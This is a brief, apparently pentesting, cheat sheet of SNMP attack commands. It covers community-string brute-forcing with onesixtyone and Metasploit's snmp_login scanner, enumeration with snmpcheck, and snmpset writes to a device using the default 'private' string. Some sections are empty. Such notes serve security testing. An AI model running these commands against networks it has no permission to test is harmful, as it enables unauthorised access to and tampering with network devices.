# Attack on SNMP protocol

## onesixtyone
```
genip 10.10.10.1-254 > hosts.txt
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i hosts.txt
```

## Metasploit

```
msfconsole
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 10.10.10.1-254
set VERBOSE false
set THREADS 4
exploit
```

## snmpcheck

```
snmpcheck -t {IP} -c {CommunityString}
```

## snmp RW

```
snmpset -v2c -c private 192.168.1.1 system.sysLocation.0 s "Foo"
snmpwalk -v2c -c private 192.168.1.1 system.syslocation.0
```

## Cain

...Windows...

## snmpblow.pl



